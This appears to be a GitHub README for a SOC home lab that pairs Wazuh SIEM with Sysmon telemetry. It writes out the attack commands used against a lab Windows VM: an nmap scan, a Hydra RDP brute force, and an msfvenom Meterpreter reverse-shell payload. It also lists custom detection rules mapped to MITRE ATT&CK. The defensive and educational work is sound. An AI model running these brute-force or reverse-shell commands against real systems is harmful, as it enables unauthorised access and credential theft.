# 🛡️ SOC SIEM Home Lab

> A fully functional Security Operations Center (SOC) built from scratch using Wazuh, Sysmon, and Kali Linux — simulating real-world cyberattacks and detecting them with custom MITRE ATT&CK-mapped detection rules.

---

## 📌 Project Overview

This project demonstrates end-to-end blue team capabilities by building a mini SOC on a local virtualized environment. Real attacks are simulated from a Kali Linux attacker VM against a Windows 10 target, while Wazuh SIEM collects logs, fires alerts, and maps detections to the MITRE ATT&CK framework.

This lab replicates what SOC analysts, detection engineers, and blue teamers do daily in enterprise environments.

---

## 🏗️ Lab Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                        HOST MACHINE                         │
│                                                             │
│  ┌───────────────┐  ┌───────────────┐  ┌───────────────┐  │
│  │  Kali Linux   │  │  Ubuntu 22.04 │  │  Windows 10   │  │
│  │  (ATTACKER)   │  │  (WAZUH SIEM) │  │   (TARGET)    │  │
│  │               │  │               │  │               │  │
│  │ • Hydra       │  │ • Wazuh Mgr   │  │ • Wazuh Agent │  │
│  │ • Nmap        │  │ • Wazuh Index │  │ • Sysmon      │  │
│  │ • Metasploit  │  │ • Dashboard   │  │ • Event Logs  │  │
│  └───────────────┘  └───────────────┘  └───────────────┘  │
│         │                   │                   │           │
│         └───────────────────┴───────────────────┘           │
│                    Host-Only Network                        │
│              192.168.192.0/24 (isolated)                    │
└─────────────────────────────────────────────────────────────┘
```

### Data Flow
```
Sysmon → Wazuh Agent → Wazuh Manager → Wazuh Indexer → Dashboard → Alerts
```

---

## 🛠️ Tools & Technologies

| Tool | Role | Version |
|------|------|---------|
| **Wazuh** | SIEM / XDR — log collection, alerting, dashboards | 4.7.5 |
| **Sysmon** | Deep Windows telemetry — process, network, registry events | Latest |
| **Kali Linux** | Attacker VM — offensive security toolset | 2024.x |
| **Windows 10** | Target endpoint — victim machine | 21H2 |
| **Ubuntu 22.04** | Wazuh server host | LTS |
| **Hydra** | Brute force attack simulation | 9.5 |
| **Nmap** | Network reconnaissance / port scanning | 7.94 |
| **Metasploit** | Reverse shell / exploitation framework | 6.x |
| **VMware Workstation** | Hypervisor — runs all VMs | Latest |

---

## ⚔️ Attacks Simulated

### 1. 🔍 Network Reconnaissance — Nmap Port Scan
**MITRE ATT&CK: T1046 — Network Service Discovery**

Performed a full SYN scan against the Windows target to discover open ports and running services.

```bash
nmap -sS -A -T4 192.168.192.129
```

**Results discovered:**
- Port 135 — Microsoft RPC
- Port 139 — NetBIOS
- Port 445 — SMB
- Port 3389 — RDP
- OS fingerprinted as Windows 10

**Wazuh detection:** Sysmon Event ID 3 (network connections) triggered mass connection alerts.

---

### 2. 🔑 Credential Attack — Hydra RDP Brute Force
**MITRE ATT&CK: T1110 — Brute Force**

Launched an automated password spray against the Windows RDP service using the rockyou.txt wordlist (14.3 million passwords).

```bash
hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://192.168.192.129 -t 4 -V
```

**Wazuh detection:** Windows Event ID 4625 (failed logon) triggered 400+ alerts within minutes, visible as a spike on the Wazuh timeline graph.

---

### 3. 💻 Remote Access — Metasploit Reverse Shell
**MITRE ATT&CK: T1059 — Command and Scripting Interpreter**

Generated a malicious payload using msfvenom and established a Meterpreter reverse shell from the Windows target back to Kali.

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.192.130 LPORT=4444 -f exe > shell.exe
```

**Wazuh detection:** Sysmon Event ID 1 (process creation) and Event ID 3 (network connection) detected the beacon.

---

## 🔎 Detection Rules

Custom Wazuh rules written in XML, stored at `/var/ossec/etc/rules/local_rules.xml`, all mapped to MITRE ATT&CK.

### Rule 1 — Brute Force Detection
```xml
<rule id="100001" level="10" frequency="5" timeframe="60">
  <if_matched_sid>60122</if_matched_sid>
  <description>Brute force attack - multiple failed logins detected</description>
  <mitre>
    <id>T1110</id>
  </mitre>
</rule>
```
**Fires when:** 5+ failed logins occur within 60 seconds.

---

### Rule 2 — Port Scan Detection
```xml
<rule id="100002" level="8">
  <if_group>sysmon</if_group>
  <field name="win.system.eventID">3</field>
  <description>Possible port scan - high volume network connections</description>
  <mitre>
    <id>T1046</id>
  </mitre>
</rule>
```
**Fires when:** Mass network connection events detected via Sysmon Event ID 3.

---

### Rule 3 — PowerShell Encoded Command
```xml
<rule id="100003" level="12">
  <if_group>windows</if_group>
  <field name="win.eventdata.commandLine" type="pcre2">-[Ee][nN][cC]</field>
  <description>PowerShell encoded command - possible malware or living-off-the-land attack</description>
  <mitre>
    <id>T1059.001</id>
  </mitre>
</rule>
```
**Fires when:** PowerShell is run with `-enc` or `-encoded` flag — a common malware technique.

---

### Rule 4 — LSASS Access (Credential Dumping)
```xml
<rule id="100004" level="15">
  <if_group>sysmon</if_group>
  <field name="win.eventdata.targetImage" type="pcre2">lsass\.exe</field>
  <field name="win.system.eventID">10</field>
  <description>LSASS process access - credential dumping attempt detected</description>
  <mitre>
    <id>T1003.001</id>
  </mitre>
</rule>
```
**Fires when:** Any process accesses lsass.exe — the primary method used by Mimikatz to steal credentials.

---

## 📊 Key Windows Event IDs Monitored

| Event ID | Description | Why It Matters |
|----------|-------------|----------------|
| 4624 | Successful logon | Track who logged in |
| 4625 | Failed logon | Detect brute force |
| 4648 | Logon with explicit credentials | Lateral movement |
| 4688 | Process creation | Detect malicious processes |
| 4698 | Scheduled task created | Persistence mechanism |
| 4720 | User account created | Privilege escalation |

## 🔬 Sysmon Event IDs Monitored

| Event ID | Description | Why It Matters |
|----------|-------------|----------------|
| 1 | Process creation | Catch malicious executables |
| 3 | Network connection | Detect C2 beacons, port scans |
| 7 | Image loaded | Detect DLL injection |
| 8 | CreateRemoteThread | Detect process injection |
| 10 | ProcessAccess | Detect LSASS dumping |
| 11 | FileCreate | Detect dropped malware |

---

## 📁 Repository Structure

```
soc-siem-homelab/
│
├── README.md                     ← This file
│
├── detection-rules/
│   └── local_rules.xml           ← All custom Wazuh detection rules
│
├── sysmon-config/
│   └── sysmonconfig.xml          ← Sysmon configuration file
│
├── attack-scripts/
│   ├── nmap-scan.sh              ← Port scan commands
│   ├── hydra-bruteforce.sh       ← Brute force commands
│   
│
├── wazuh-config/
│   └── ossec.conf                ← Wazuh agent configuration
│
└── screenshots/
    ├── wazuh-dashboard.png       ← Dashboard overview
    ├── alerts-firing.png         ← Alerts during attack
    ├── mitre-mapping.png         ← MITRE ATT&CK mapping
    └── nmap-results.png          ← Nmap scan output
```

---

## 🚀 How to Reproduce This Lab

### Prerequisites
- VMware Workstation (or VirtualBox)
- 16 GB RAM minimum on host
- 150 GB free disk space

### Step 1 — Create VMs
| VM | OS | RAM | Disk | Network |
|----|-----|-----|------|---------|
| Wazuh Server | Ubuntu 22.04 | 6 GB | 50 GB | Host-only |
| Target | Windows 10 | 4 GB | 60 GB | Host-only |
| Attacker | Kali Linux | 2 GB | 40 GB | Host-only |

### Step 2 — Install Wazuh (Ubuntu VM)
```bash
curl -sO https://packages.wazuh.com/4.7/wazuh-install.sh
sudo bash wazuh-install.sh -a --ignore-check
```

### Step 3 — Install Sysmon (Windows VM)
```powershell
.\Sysmon64.exe -accepteula -i sysmonconfig.xml
```

### Step 4 — Deploy Wazuh Agent (Windows VM)
```powershell
msiexec /i wazuh-agent-4.7.5-1.msi WAZUH_MANAGER="<UBUNTU-IP>" /q
NET START WazuhSvc
```

### Step 5 — Add Detection Rules (Ubuntu VM)
```bash
sudo nano /var/ossec/etc/rules/local_rules.xml
# Paste rules from detection-rules/local_rules.xml
sudo systemctl restart wazuh-manager
```

### Step 6 — Run Attacks (Kali VM)
```bash
# Port scan
nmap -sS -A -T4 <WINDOWS-IP>

# Brute force
hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://<WINDOWS-IP> -t 4 -V
```

---

## 🎯 MITRE ATT&CK Coverage

| Technique ID | Name | Detection Method |
|-------------|------|-----------------|
| T1046 | Network Service Discovery | Sysmon Event 3 — mass connections |
| T1110 | Brute Force | Event ID 4625 — failed logins |
| T1059.001 | PowerShell Abuse | Command line pattern matching |
| T1003.001 | LSASS Memory Dump | Sysmon Event 10 — process access |
| T1078 | Valid Accounts | Logon event correlation |

---

## 📈 Results

- **607+ alerts** generated and detected during attack simulations
- **4 custom detection rules** written and validated
- **Full MITRE ATT&CK mapping** for all detected techniques
- **Real-time alerting** visible on Wazuh dashboard within seconds of attack launch
- **Zero false negatives** on simulated attack scenarios

---

## 🧠 Skills Demonstrated

- SIEM deployment and configuration (Wazuh)
- Endpoint telemetry collection (Sysmon)
- Detection rule engineering (XML, regex/PCRE2)
- Attack simulation (Hydra, Nmap, Metasploit)
- Log analysis and threat hunting
- MITRE ATT&CK framework application
- Network segmentation and VM lab design
- Incident investigation workflow

---

## 📜 Certifications This Project Aligns With

- CompTIA Security+
- CompTIA CySA+
- Elastic Certified Analyst
- BTL1 (Blue Team Labs Level 1)
- TryHackMe SOC Level 1 Path

---

## ⚠️ Disclaimer

This lab is built in a fully isolated virtual environment for educational purposes only. All attacks are performed against machines I own and control. Never use these techniques against systems you do not have explicit permission to test.

---

## 👤 Author

Built as a hands-on SOC home lab to demonstrate real-world blue team and detection engineering skills.

⭐ If this project helped you, consider giving it a star!
